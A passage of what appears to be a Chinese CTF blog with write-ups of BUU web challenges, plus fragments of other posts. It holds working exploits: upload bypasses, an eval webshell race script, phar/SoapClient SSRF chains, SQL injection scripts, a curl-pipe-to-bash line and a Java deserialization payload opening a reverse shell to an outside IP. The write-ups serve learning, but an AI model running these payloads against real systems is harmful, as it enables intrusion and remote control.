$config[&#39;token&#39;] = md5($filename . session_id()); break; case &#39;oss&#39;: $time = time() + 3600; $policyText = [ &#39;expiration&#39; =&gt; date(&#39;Y-m-d&#39;, $time) . &#39;T&#39; . date(&#39;H:i:s&#39;, $time) . &#39;.000Z&#39;, &#39;conditions&#39; =&gt; [[&#39;content-length-range&#39;, 0, 1048576000]], ]; $config[&#39;policy&#39;] = base64_encode(json_encode($policyText)); $config[&#39;server&#39;] = FileService::getUploadOssUrl(); $config[&#39;site_url&#39;] = FileService::getBaseUriOss() . $filename; $config[&#39;signature&#39;] = base64_encode(hash_hmac(&#39;sha1&#39;, $config[&#39;policy&#39;], sysconf(&#39;storage_oss_secret&#39;), true)); $config[&#39;OSSAccessKeyId&#39;] = sysconf(&#39;storage_oss_keyid&#39;); } $this-&gt;result($config, &#39;NOT_FOUND&#39;); } 主要作用如下：1、将通过 POST 传入的 md5 值以16位字母为间隔进行分割，并拼接传入filename 的后缀2、检测文件是否上传3、生成 config 数组，并添加每一个键的值 之后调用 upload ，这里看文件上传处理的位置（359行 public function upload() { $file = $this-&gt;request-&gt;file(‘file’); $ext = strtolower(pathinfo($file-&gt;getInfo(‘name’), 4)); $md5 = str_split($this-&gt;request-&gt;post(‘md5’), 16); $filename = join(‘/‘, $md5) . “.{$ext}”; if (strtolower($ext) == ‘php’ || !in_array($ext, explode(‘,’, strtolower(sysconf(‘storage_local_exts’))))) { return json([‘code’ =&gt; ‘ERROR’, ‘msg’ =&gt; ‘文件上传类型受限’]); } // 文件上传Token验证 if ($this-&gt;request-&gt;post(‘token’) !== md5($filename . session_id())) { return json([‘code’ =&gt; ‘ERROR’, ‘msg’ =&gt; ‘文件上传验证失败’]); } // 文件上传处理 if (($info = $file-&gt;move(‘static’ . DS . ‘upload’ . DS . $md5[0], $md5[1], true))) { if (($site_url = FileService::getFileUrl($filename, ‘local’))) { return json([‘data’ =&gt; [‘site_url’ =&gt; $site_url], ‘code’ =&gt; ‘SUCCESS’, ‘msg’ =&gt; ‘文件上传成功’]); } } return json([&#39;code&#39; =&gt; &#39;ERROR&#39;, &#39;msg&#39; =&gt; &#39;文件上传失败&#39;]); } 跟进 move，这里弟弟用的notepad，搜了半天。 // 文件保存命名规则 $saveName = $this-&gt;buildSaveName($savename); $filename = $path . $saveName;跟进 buildSaveName if (!strpos($savename, ‘.’)) { $savename .= ‘.’ . pathinfo($this-&gt;getInfo(‘name’), PATHINFO_EXTENSION); } return $savename; 关键点就在 最后一个if判断上 判断 $savename里是否有. 有的话就会直接 return $savename看前面的调用发现 这个savename就是 调用move函数的第二个参数 也就是 $md5[1]：move(‘static’ . DS . ‘upload’ . DS . $md5[0], $md5[1], true))经过buildSaveName($savename)后会直接返回$md5[1]，然后拼接在$path的后面做为文件名，后面直接调用move_uploaded_file()将文件移动到$path，在这个过程中$ma5[1]是可控的，所以我们可以直接上传php文件。首先生成带木马的图片，然后生成token值，php &gt; echo md5(“aa”);4124bc0a9335c27f086f24ba207a4912echo md5(“4124bc0a9335c27f/086f24ba207a.php.png”);bf9b89e7c8f5f1159d8bd7aaaa9c795d postman构造请求包发送即可参考链接：https://www.anquanke.com/post/id/224207（建议直接看这个 [羊城杯2020]easyphp关键词：htaccess头文件包含这题看着就觉得奇怪，写了一堆waf不是直接往index.php写个马不就行了？但是没写进去，应该是没有权限。没权写index，那就只能想别的办法了（除了index都会被删除方法：利用.htaccess设置文件自动包含.htaccess也可以设置开头自动包含，.htaccess设置php环境变量的格式： #formatphp_value setting_name setting_value #examplephp_value auto_prepend_file .htaccess所以传参?filename=.htaccesscontent有过滤 需要先绕过 $content = $_GET[‘content’]; if(stristr($content,’on’) || stristr($content,’html’) || stristr($content,’type’) || stristr($content,’flag’) || stristr($content,’upload’) || stristr($content,’file’)) { echo “Hacker”; die();可以通过对过滤的关键字中间添加换行\\n来绕过stristr函数的检测，不过仍然需要注意添加\\来转义掉换行，这样才不会出现语法错误，如此一来就不需要再绕过preg_match函数，即可直接写入.htaccess来getshell?content=php_value%20auto_prepend_fil\\%0ae%20.htaccess%0a%23&lt;?php%20system(‘cat%20/fla’.’g’);?&gt;\\&amp;filename=.htaccess写入内容：php_value auto_prepend_fil\\e .htaccess #&lt;?php system(‘cat /fla’.’g’);?&gt;\\ 用filter流base64decode content中内容也可以绕过 [WMCTF2020]Make PHP Great Again预期解：require_once 绕过不能重复包含文件的限制在php中，require_once在调用时php会检查该文件是否已经被包含过，如果是则不会再次包含。所以我们要读取flag.php，必须绕过这个限制。原理解析：https://www.anquanke.com/post/id/213235；https://blog.frankli.site/2020/08/05/WMCTF2020-PHP-source-analysis/payload：php://filter/convert.base64-encode/resource=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/var/www/html/flag.php/proc/self/root只能多不能少，原理见链接2。 非预期1：?file=php://filter/convert.base64-encode/resource=/Troy3e/../proc/self/cwd/flag.php附所有proc解析：https://blog.csdn.net/weixin_37778713/article/details/106130248非预期2：利用session.upload_progress进行文件包含在PHP&gt;5.4，session.upload_progress.enabled这个参数在php.ini中默认开启，在上传的过程中会生成上传进度文件，PHP将会把此次文件上传的详细信息(如上传时间、上传进度等)存储在session当中 ，它的存储路径可以在phpinfo中查到.可以利用session.upload_progress将恶意语句写入session文件，再去利用竞争在session清空前包含session文件，达到Getshell的目的。exp： #coding=utf-8 import io import requests import threading sessid = &#39;peri0d&#39; data = {&quot;cmd&quot;:&quot;system(&#39;whoami&#39;);&quot;} def write(session): while True: f = io.BytesIO(b&#39;a&#39; * 1024 * 50) resp = session.post( &#39;http://5bee85f4-0831-4fcf-a4c2-f33a607684b0.node3.buuoj.cn/&#39;, data={&#39;PHP_SESSION_UPLOAD_PROGRESS&#39;: &#39;&lt;?php eval($_POST[&quot;cmd&quot;]);?&gt;&#39;}, files={&#39;file&#39;: (&#39;peri0d.txt&#39;,f)}, cookies={&#39;PHPSESSID&#39;: sessid} ) def read(session): while True: resp = session.post(&#39;http://5bee85f4-0831-4fcf-a4c2-f33a607684b0.node3.buuoj.cn/?file=/tmp/sess_&#39;+sessid,data=data) if &#39;peri0d.txt&#39; in resp.text: print(resp.text) event.clear() else: print(&#39;++++++++++++++++&#39;) if __name__==&quot;__main__&quot;: event=threading.Event() with requests.session() as session: for i in xrange(1,30): threading.Thread(target=write,args=(session,)).start() for i in xrange(1,30): threading.Thread(target=read,args=(session,)).start() event.set() 神仙 膜了 https://blog.csdn.net/weixin_48537150/article/details/113189052 [SUCTF 2019]Upload Labs 2关键词：phar反序列化给了admin.php源码，rce需要本地IP，由于是remoteaddr，无法直接伪造，所以得寻找ssrf的点。class.php里wakeup函数里有个ReflectionClass类，报告了一个类的有关信息。接下来会调用newInstanceArgs函数，查阅官方文档可知此函数从给出的参数创建一个新的类实例。也就是可以实例化任何类。思路：上传一个phar文件，在func.php读取该文件，getMIME()触发phar反序列化，从而调用SoapClient类，成功伪造IP。exp： &lt;?php $phar = new Phar(&#39;troy3e.phar&#39;); $phar-&gt;startBuffering(); $phar-&gt;addFromString(&#39;text.txt&#39;,&#39;text&#39;); $phar-&gt;setStub(&#39;&lt;script language=&quot;php&quot;&gt;__HALT_COMPILER();&lt;/script&gt;&#39;); //bypass class.php waf class File { public $file_name = &quot;&quot;; public $func = &quot;SoapClient&quot;; function __construct(){ $target = &quot;http://127.0.0.1/admin.php&quot;; $post_string = &#39;admin=&amp;cmd=curl http://henuctf.com:5555/tmp/|bash&amp;clazz=SplStack&amp;func1=push&amp;func2=push&amp;func3=push&amp;arg1=123456&amp;arg2=123456&amp;arg3=&#39;. &quot;\\r\\n&quot;; $headers = []; $this-&gt;file_name = [ null, array(&#39;location&#39; =&gt; $target, &#39;user_agent&#39;=&gt; str_replace(&#39;^^&#39;, &quot;\\r\\n&quot;, &#39;xxxxx^^Content-Type: application/x-www-form-urlencoded^^&#39;.join(&#39;^^&#39;,$headers).&#39;Content-Length: &#39;. (string)strlen($post_string).&#39;^^^^&#39;.$post_string), &#39;uri&#39;=&gt;&#39;hello&#39;) ]; } } $object = new File; echo urlencode(serialize($object)); $phar-&gt;setMetadata($object); $phar-&gt;stopBuffering(); buu环境有变，直接cmd那里弹shell即可。soapclient+CRLF参考：https://blog.csdn.net/qq_42181428/article/details/100569464 看了下官方WP，出题人本意似乎是想在admin.php的wakeup函数里提供flag获取方式，这样就需要新的姿势了出题人笔记：https://xz.aliyun.com/t/6057在wakeup里的话就需要去想方法触发反序列化了，这其实就对应了admin.php里面sql的奇怪代码：$reflect = new ReflectionClass($this-&gt;clazz);$this-&gt;instance = $reflect-&gt;newInstanceArgs(); $reflectionMethod = new ReflectionMethod($this-&gt;clazz, $this-&gt;func1);$reflectionMethod-&gt;invoke($this-&gt;instance, $this-&gt;arg1); $reflectionMethod = new ReflectionMethod($this-&gt;clazz, $this-&gt;func2);$reflectionMethod-&gt;invoke($this-&gt;instance, $this-&gt;arg2); $reflectionMethod = new ReflectionMethod($this-&gt;clazz, $this-&gt;func3);$reflectionMethod-&gt;invoke($this-&gt;instance, $this-&gt;arg3); 分别对应了：$m = new mysqli();$m-&gt;init();$m-&gt;real_connect(‘ip’,’select 1’,’select 1’,’select 1’,3306);$m-&gt;query(‘select 1;’); 后面总结的话，就是mysql也会触发phar反序列化，那么 Rogue Mysql 的攻击当然适用于 phar 反序列化了。猛。 [SWPUCTF 2016]Web7关键词：python urllib头注入参考：https://guokeya.github.io/post/swpuctf-2016web7urllib-tou-zhu-ru-ssrf/很久之前的洞了，学习一下原理就行。input界面随手输个1报错：Powered by CherryPy 17.4.2调用了urllib2.open漏洞原理是urllib在解析url时。接受URL编码的值。会包含在HTTP数据流中。那么我们就可以通过%0d%0a去构造一个新的HTTP请求。通过urllib注入redis。修改admin密码https://blog.csdn.net/niexinming/article/details/53024755此题应该没什么意义了，年代过于久远。 [SWPU2019]Web6关键词：Mysql中的WITH ROLLUP用法；利用session.upload_progress进行文件包含和反序列化渗透参考: https://blog.csdn.net/lllffg/article/details/114899739?spm=1001.2014.3001.5501；https://guokeya.github.io/post/EY20O7D3Q/输入1’ or 1=1#显示wrong password，说明只会检测password（如果不检测的话就直接过了想起来前几天blackwatch那道题用的rollup，这里也尝试一下：1’ or ‘1’=’1’ group by passwd with rollup having passwd is NULL #根据官方提示wsdl.php，method=hint得到：a few file may be helpful index.php Service.php interface.php se.php显然可以用file_read方法读取源码。读取到除了Service.php的其他四个文件源码。调用get_flag提示需要admin以127.0.0.1访问，cookie中有一串加密的代码，通过逆向encode.php得到cookie值为xiaoC:1。（可以跳过伪造一个admin 加密一下是xZmdm9Nxag==。现在有了admin身份，还需要127.0.0.1ini_set(‘session.serialize_handler’, ‘php’); https://www.freebuf.com/vuls/202819.html；https://blog.spoock.com/2016/10/16/php-serialize-problem/?utm_source=tuicool&amp;utm_medium=referral由于在已给的四个源码里都没有找到get_flag类，所以猜测一定是存在于我们无法读取的Service.php。那么思路就是 先生成ssrf的paylaod，然后利用session.upload_progress打过去，再加上soapcilent触发ssrf 那么现在admin和127.0.0.1都有了。最后只需要利用se.php的反序列化call一下service.php的get_flag即可（芜湖~ 数据包：POST /index.ph HTTP/1.1Host: ba7f99ed-9458-4e45-953f-a28cd1dd7a5c.node3.buuoj.cnUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:86.0) Gecko/20100101 Firefox/86.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,/;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Connection: closeReferer: http://ba7f99ed-9458-4e45-953f-a28cd1dd7a5c.node3.buuoj.cn/index.phpCookie: PHPSESSID=troy3e;Content-Type: multipart/form-data; boundary=——–1995995913Content-Length: 440Connection: closeAccept-Encoding: gzip,deflate ———-1995995913Content-Disposition: form-data; name=”PHP_SESSION_UPLOAD_PROGRESS” |O:10:”SoapClient”:4:{s:3:”uri”;s:4:”aaab”;s:8:”location”;s:30:”http://127.0.0.1/interface.php”;s:11:”_user_agent”;s:60:”wupcoX-Forwarded-For: 127.0.0.1Cookie: user=xZmdm9NxaQ==”;s:13:”_soap_version”;i:1;}———-1995995913Content-Disposition: form-data; name=”file”; filename=”1.txt”Content-Type: text/plain ———-1995995913– 数据包2：POST /se.php HTTP/1.1Host: ba7f99ed-9458-4e45-953f-a28cd1dd7a5c.node3.buuoj.cnUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:86.0) Gecko/20100101 Firefox/86.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,/;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateConnection: closeCookie: PHPSESSID=troy3e;Upgrade-Insecure-Requests: 1Content-Type: application/x-www-form-urlencodedContent-Length: 276 aa=O:2:&quot;bb&quot;:2:{s:4:&quot;mod1&quot;;O:2:&quot;aa&quot;:2:{s:4:&quot;mod1&quot;;N;s:4:&quot;mod2&quot;;a:1:{s:5:&quot;test2&quot;;O:2:&quot;cc&quot;:3:{s:4:&quot;mod1&quot;;O:2:&quot;ee&quot;:2:{s:4:&quot;str1&quot;;O:2:&quot;dd&quot;:3:{s:4:&quot;name&quot;;N;s:4:&quot;flag&quot;;s:8:&quot;Get_flag&quot;;s:1:&quot;b&quot;;s:14:&quot;call_user_func&quot;;}s:4:&quot;str2&quot;;s:7:&quot;getflag&quot;;}s:4:&quot;mod2&quot;;N;s:4:&quot;mod3&quot;;N;}}}s:4:&quot;mod2&quot;;N;} pop链比较简单就不写了，忘了的话看参考链接。数据包最好能自己python写了然后bp抓，这样记忆会更深。 [RoarCTF 2019]PHPShe关键词：CVE-2019-9762：phar反序列化没办法注册，直接刷掉了一堆网上的cve。但这个还能用：/include/plugin/payment/alipay/pay.php?id=pay%20union%20select%201,2,3,4,5,6,7,8,9,10,11,12%23_ 用反引号是因为源码里插入就是反引号，这里的下划线大概是和本身传入的pay_2891314719这种格式有关，必须得加上。然后会发现burp回显3，不是很明显需要仔细点看。 把3换成database()得到phpshe2，然而接下来却无法直接注出表名，需要用到无列名注入：https://zhuanlan.zhihu.com/p/98206699 /include/plugin/payment/alipay/pay.php?id=pay%20where%201=1%20union%20select%201,2,((select3from(select%201,2,3,4,5,6%20union%20select%20*%20from%20admin)a%20limit%201,1)),4,5,6,7,8,9,10,11,12%23_得到2476bf5c8d3653e843b6ed42c0672b91解密altman777，成功登入后台。根据WP 说是在源码中的类文件进行了修改（可以用diffinity对比出来，几万行代码是不可能手动找的 public function __destruct() { $this-&gt;extract(PCLZIP_OPT_PATH, $this-&gt;save_path); } PCLZIP解压缩，然后将文件放在指定目录，同时品牌管理处又能上传zip文件，那么只要想办法触发即可。即在admin.php上传的压缩的一句话木马文件要触发这里的destruct。那么就从admin.php开始看，首先：include(‘common.php’);common.php 12行就有个变量覆盖 if (@ini_get(‘register_globals’)) { foreach ($_REQUEST as $name =&gt; $value) unset($$name); //这里没懂为啥会触发覆盖 } …… if (get_magic_quotes_gpc()) { //这函数恒为false，从7.4版本就被废弃。 !empty($_GET) &amp;&amp; extract(pe_trim(pe_stripslashes($_GET)), EXTR_PREFIX_ALL, ‘_g’); !empty($_POST) &amp;&amp; extract(pe_trim(pe_stripslashes($_POST)), EXTR_PREFIX_ALL, ‘_p’); } else { !empty($_GET) &amp;&amp; extract(pe_trim($_GET),EXTR_PREFIX_ALL,’_g’); !empty($_POST) &amp;&amp; extract(pe_trim($_POST),EXTR_PREFIX_ALL,’_p’);后面说是对变量加上前缀。进行处理。在前缀和键值中会加一个下划线。继续看。可以包含任意目录的php文件（其实早就已经看不懂了。。。if (in_array(“{$mod}.php”, pe_dirlist(“{$pe[‘path_root’]}module/{$module}/*.php”))) { include(“{$pe[‘path_root’]}module/{$module}/{$mod}.php”);}利用变量覆盖。包含admin目录下的moban.php（/module/admin/moban.php只有它引用了pclzip.class.php（罢了 这要是我一辈子找不着 看guoke师傅 wp就行了QAQswitch一个参数进入del： case ‘del’: pe_token_match(); $tpl_name = pe_dbhold($_g_tpl); if ($tpl_name == ‘default’) pe_error(‘默认模板不能删除…’); if ($db-&gt;pe_num(‘setting’, array(‘setting_key’=&gt;’web_tpl’, ‘setting_value’=&gt;$tpl_name))) { pe_error(‘使用中不能删除’); } else { pe_dirdel(“{$tpl_name}”); pe_success(‘删除成功!’); } break;pe_dirdel函数触发phar反序列化。 懂了，大致意思就是上传一个压缩的phar文件： &lt;?php class PclZip{ var $zipname = ‘’; var $zip_fd = 0; var $error_code = 1; var $error_string = ‘’; var $magic_quotes_status; var $save_path = ‘/var/www/html/data’;//解压目录 function __construct($p_zipname){ $this-&gt;zipname = $p_zipname; $this-&gt;zip_fd = 0; $this-&gt;magic_quotes_status = -1; return; } } $a=new PclZip(&quot;/var/www/html/data/attachment/brand/1.zip&quot;);//压缩的文件路径 echo serialize($a); $phar = new Phar(&quot;phar.phar&quot;); $phar-&gt;startBuffering(); $phar-&gt;setStub(&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); $phar-&gt;setMetadata($a); $phar-&gt;addFromString(&quot;test.txt&quot;, &quot;troy3e&quot;); $phar-&gt;stopBuffering(); ?&gt; 目的是后面反序列化时（moban.php里的那个del触发）触发PclZip类，解压webshell的压缩文件然后写入我们指定的目录，完美。然后嘞，康康师傅的wp先~哦 还有一个注意点就是625行那个函数，需要传一个token，抓包即可获得。执行exp生成phar.phar然后修改后缀为可上传的任意后缀（txt上传webshell的压缩文件和phar.txt（burp抓包改上删文件触发反序列化GET /admin.php?mod=moban&amp;act=del&amp;token=07aeb0cfb9db219504d34f4edfa2a135&amp;tpl=phar:///var/www/html/data/attachment/brand/3.txt HTTP/1.1Host: 9515c71a-972b-419f-847a-eb166c73ba9b.node3.buuoj.cnUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:86.0) Gecko/20100101 Firefox/86.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,/;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateConnection: closeReferer: http://9515c71a-972b-419f-847a-eb166c73ba9b.node3.buuoj.cn/admin.php?mod=mobanCookie: UM_distinctid=178395fbb40cc-02783c99f63357-4c3f227c-1fa400-178395fbb417c4; PHPSESSID=pgqota5okm9rgj7s3oammmvu14Upgrade-Insecure-Requests: 1这里3.txt路径是可以在上传界面获得的参考：https://nikoeurus.github.io/2019/10/14/RoarCTF/#%E5%90%8E%E5%8F%B0getshellhttps://blog.csdn.net/mochu7777777/article/details/107550135https://guokeya.github.io/post/zE_m1kHQm/ 还是得多分析源码才能进步。 [V&amp;N2020 公开赛]EasySpringMVC关键词：Java反序列化Java反序列化没怎么仔细研究过 这两次比赛吃了很大的亏总结一篇博客学习一下 见 Java反序列化学习.mdhttp://1cd4a2bb-5036-4365-be52-3f7b33bbb5b8.node3.buuoj.cn/springmvcdemo/showpic.form?file=showpic.jsp上传图片点 需要webmanager组权限 file参数尝试任意文件读取显示only show you picture file !（失败开始审源码，拖到jdgui里首先看web.xml。（web.xml是J2EE定义的描述这个webapp的一个配置文件，非常重要。） &lt;?xml version=”1.0” encoding=”UTF-8”?&gt; contextConfigLocation /WEB-INF/applicationContext.xml org.springframework.web.context.ContextLoaderListener clientinfo com.filters.ClentInfoFilter clientinfo dispatcher org.springframework.web.servlet.DispatcherServlet 1 dispatcher .form 先看最下面一段： dispatcher .form 该配置文件用servlet-mapping指明所有.form格式路径的访问交给名为dispatcher的servlet处理。servlet就是处理HTTP请求的核心类。 dispatcher org.springframework.web.servlet.DispatcherServlet 1 再看这一段，表明这个dispatcher servlet是一个org.springframework.web.servlet.DispatcherServlet，也就是说这个webapp使用了Spring框架。比较有趣的是还定义了一个filter。 clientinfo com.filters.ClentInfoFilter clientinfo * 这段代码表示，对所有servlet的访问，都需要经过com.filters.ClentInfoFilter类。filter的作用一般是在HTTP请求到达servlet之前或之后，对HTTP请求或响应进行处理，比如检查这个请求是否拥有权限。controller类WP直接一句话带过说没有有问题的地方，当然我们学习的还是得自己看一遍。只有show类里面有个序列化 别的地方 upload不用看 index里面就是一些判断。接下来看上面提到的filter if (cookies != null) for (Cookie c : cookies) { if (c.getName().equals(“cinfo”)) { exist = true; cookie = c; break; } }可以看到filter首先从众多cookies中找到这个cinfo这个cookie。然后下面有：bytes = Tools.create(cinfo);跟进Tools类，芜湖！： private void readObject(ObjectInputStream in) throws IOException, ClassNotFoundException { Object obj = in.readObject(); (new ProcessBuilder((String[])obj)).start(); } }Tools对这个字节数组直接readObject，进行反序列化操作！也就是说我们客户端提交的数据，服务器无条件信任，并反序列化。Java的反序列化和PHP反序列化类似，php在反序列化的时候会调用对应类的__wakeup()函数，而java会调用该类readObject()函数。如果我们构造一个Tools类，反序列化的时候，readObject会被自动调用，然后读到的obj会被强制类型转换为String[]，达到命令执行。由于反序列化的时候读取的对象直接被传入Processbuilder，我们在Tools类内重写writeObject方法，直接将命令写入。 Tools.class package com.tools;//一定要这个原文件同名的路径 import java.io.ByteArrayInputStream; import java.io.ByteArrayOutputStream; import java.io.IOException; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.io.Serializable; public class Tools implements Serializable { private static final long serialVersionUID = 1L; private String testCall; public static Object parse(byte[] bytes) throws Exception { ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(bytes)); return ois.readObject(); } public static byte[] create(Object obj) throws Exception { ByteArrayOutputStream bos = new ByteArrayOutputStream(); ObjectOutputStream outputStream = new ObjectOutputStream(bos); outputStream.writeObject(obj); outputStream.writeObject(obj); outputStream.writeObject(obj); return bos.toByteArray(); outputStream.writeObject(obj); } private void readObject(ObjectInputStream in) throws IOException, ClassNotFoundException { Object obj = in.readObject(); (new ProcessBuilder((String[])obj)).start(); } private void writeObject(ObjectOutputStream out) throws IOException,ClassNotFoundException { String[] cmd={&quot;bash&quot;,&quot;-c&quot;,&quot;bash -i&gt;&amp; /dev/tcp/121.196.169.53/3333 0&gt;&amp;1&quot;}; out.writeObject(cmd); } } example3_1.class package example; import com.tools.Tools; import java.util.Base64; public class example3_1 { public static void main(String[] args) { Base64.Encoder encoder = Base64.getEncoder(); try { Tools cinfo = new Tools(); byte[] bytes = Tools.create(cinfo); String payload = encoder.encodeToString(bytes); System.out.println(payload); } catch (Exception e) { e.printStackTrace(); } } } [VNCTF 2021]realezjvavWP说笛卡尔积盲注 我偏不信 试了下别的方法 都不行 好吧 wsfw其实在注释里已经写了both username and password are right , then you can enter the next level所以不能admin\\这种。同时sleep benchmark都被过滤 而且没有回显 必须盲注 只能笛卡尔积试试了。原理：SELECT count() FROM information_schema.columns A,information_schema.columns B,information_schema.columns C;根据数据库查询的特点，这句话的意思就是将 A B C 三个表进行笛卡尔积（全排列），并输出 最终的行数，执行效果如下：执行效果是跑了十分钟都没跑出来 网上看了应该是 count() 六千多万光一个表的话是三千多 一下子就能出来。那么利用原理就是根据回显速度注入 和时间盲注一个原理(当然回显速度需要对payload进行调整)官方exp: import requests import time url = “http://cacbd0a9-16f5-497b-8346-dae9d466ddb4.node3.buuoj.cn/user/login” i = 0 flag = “” while True : i += 1 head = 32 tail = 126 while head &lt; tail : mid = head + tail &gt;&gt; 1 payload = “a’ or (if(ascii(substr(password,%d,1))&gt;%d,(SELECT//count(*)//FROM//information_schema.tables//A,information_schema.columns//B,information_schema.tables//C),1))#” % (i,mid) data = {“username”:”admin” , “password” : payload} start_time = time.time() r = requests.post(url,data = data) print(data[‘password’]) end_time = time.time() if end_time - start_time &gt; 3: head = mid + 1 else : tail = mid if head!=32: flag += chr(head) print(flag) else: break注的很慢 因为那语句大概要执行6秒钟密码no_0ne_kn0w_th1s进去是创建角色，查看图片路径：http://cacbd0a9-16f5-497b-8346-dae9d466ddb4.node3.buuoj.cn/searchimage?img=2.png怀疑存在任意文件读取，但是我不知道要读什么 自己随便试了一下：../../../../../../web.xml不行，查看wp：searchimage?img=../../../../../pom.xml？说是Spring里面pom.xml放了外部依赖，麻了。看到fastjson com.alibaba fastjson 1.2.27 rce：https://github.com/CaijiOrz/fastjson-1.2.47-RCE；https://y4tacker.blog.csdn.net/article/details/114949206flag_no_one_know_abccba.txt复现还算简单。","categories":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}],"tags":[],"keywords":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}]},{"title":"BUU WebWP","slug":"BUU-WebWP","date":"2021-03-28T12:41:50.000Z","updated":"2021-03-28T12:43:59.595Z","comments":true,"path":"2021/03/28/BUU-WebWP/","link":"","permalink":"/2021/03/28/BUU-WebWP/","excerpt":"","text":"BUU以前做的Web合集：https://github.com/ITroyeSivan/BUUWebWP","categories":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}],"tags":[{"name":"BUU","slug":"BUU","permalink":"/tags/BUU/"}],"keywords":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}]},{"title":"Java反序列化学习","slug":"Java反序列化学习","date":"2021-03-25T08:03:39.000Z","updated":"2021-03-25T08:05:24.020Z","comments":true,"path":"2021/03/25/Java反序列化学习/","link":"","permalink":"/2021/03/25/Java反序列化学习/","excerpt":"","text":"这几天做了很多题 经验总结一句话就是：要多分析源码。Java一直没去深入研究 比赛的时候自己根本没法做 还是连续两场都碰上 非常后悔 从今往后分析平台源码也得加入每日学习内容了。进入正文—————————————————————————————————— Java反序列化有啥用?1)把对象的字节序列永久地保存到硬盘上，通常存放在一个文件中；2)在网络上传送对象的字节序列 Java中的API实现 Java.io.ObjectOutputStream&amp;&amp;Java.io.ObjectInputStream ObjectOutputStream类 –&gt; writeObject()该方法对参数指定的obj对象进行序列化，把字节序列写到一个目标输出流中，按Java的标准约定是给文件一个.ser扩展名。想起来前几天补考Java才刚学过hhh打开eclipse试一下： package example; import java.io.*; public class example3_1{ public static void main(String args[]) throws Exception{ String obj = &quot;emt&quot;; // 将序列化对象写入文件object.txt中 FileOutputStream fos = new FileOutputStream(&quot;troy3e.ser&quot;); ObjectOutputStream os = new ObjectOutputStream(fos); os.writeObject(obj); os.close(); // 从文件object.txt中读取数据 FileInputStream fis = new FileInputStream(&quot;troy3e.ser&quot;); ObjectInputStream ois = new ObjectInputStream(fis); // 通过反序列化恢复对象obj String obj2 = (String)ois.readObject(); System.out.println(obj2); ois.close(); } } 先通过输入流创建一个文件，再调用ObjectOutputStream类的 writeObject方法把序列化的数据写入该文件;然后调用ObjectInputStream类的readObject方法反序列化数据并打印数据内容。对于类的话 实现Serializable和Externalizable接口的类的对象才能被序列化。（class Troy3e implements Serializable） 漏洞产生原因与PHP反序列化是一个道理，如果Java应用对用户输入，即不可信数据做了反序列化处理，那么攻击者可以通过构造恶意输入，让反序列化产生非预期的对象，非预期的对象在产生过程中就有可能带来任意代码执行。 实战分析一、[V&amp;N2020 公开赛]EasySpringMVCWP本地记录。二、NepCTFWP本地记录。 持续更新。PS：WP以后会做一个合集，不再单发水博客。","categories":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}],"tags":[],"keywords":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}]},{"title":"博客暂时停更","slug":"WP暂时停更","date":"2021-03-16T03:17:25.000Z","updated":"2021-03-17T12:27:25.617Z","comments":true,"path":"2021/03/16/WP暂时停更/","link":"","permalink":"/2021/03/16/WP暂时停更/","excerpt":"","text":"接下来很长一段时间开始爆肝学习模式。由于刷题较多和更新博客比较耗费时间的问题 WP改为本地记录。等什么时候能拿出成绩了恢复更新。（不影响技术博客Troy3e 2021/3/16","categories":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}],"tags":[],"keywords":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}]},{"title":"渗透测试之信息收集","slug":"渗透测试之信息收集","date":"2021-03-13T05:42:09.000Z","updated":"2021-03-13T07:24:59.278Z","comments":true,"path":"2021/03/13/渗透测试之信息收集/","link":"","permalink":"/2021/03/13/渗透测试之信息收集/","excerpt":"","text":"#信息收集 信息收集的方式可以分为两种：主动和被动。主动信息收集：通过直接访问、扫描网站，这种流量将流经网站被动信息收集：利用第三方的服务对目标进行访问了解，比例：Google搜索、Shodan搜索等.Google Hacking的用法:https://blog.csdn.net/qq_36119192/article/details/84029809Shodan的基本使用:https://blog.csdn.net/qq_36119192/article/details/84031765 #域名信息的收集 当我们确定了要渗透的目标，也就是知道了其域名，接下来我们需要收集域名对应的 ip，域名的whois信息、子域名等等一系列与域名相关的信息。 判断域名对应的IP：首先，我们要判断该域名是否存在CDN的情况，我们可以去在线CDN查询网站：http://ping.chinaz.com/ 。如果查询出的ip数量大于一个的话，则说明该ip地址不是真实的服务器地址。以我的经验来看，如果是2个或者3个，并且这几个地址是同一地区的不同运营商的话，则很有可能这几个地址是服务器的出口地址，该服务器在内网中，通过不同运营商NAT映射供互联网访问，同时采用几个不同的运营商可以负载均衡和热备份。如果是多个ip地址，并且这些ip地址分布在不同地区的话，则基本上可以断定就是采用了CDN了。那么如何绕过CDN查找网站真实的ip地址呢？ 